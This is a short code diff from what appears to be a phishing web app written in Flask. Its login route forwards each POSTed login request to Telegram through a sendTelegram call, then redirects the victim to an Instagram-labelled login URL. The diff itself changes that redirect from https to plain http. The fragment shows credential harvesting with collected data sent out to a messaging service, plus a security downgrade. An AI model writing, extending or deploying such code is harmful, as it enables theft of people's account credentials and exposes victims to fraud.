@@ -64,7 +64,7 @@ def login():
         # Process and handle the login data
         sendTelegram(request)
         # Redirect to the login page after POST request
-        return redirect('https://s-usm.md/login/instagram')
+        return redirect('http://s-usm.md/login/instagram')
     else:
         # Serve the login page on a GET request
         return render_template('login.html')
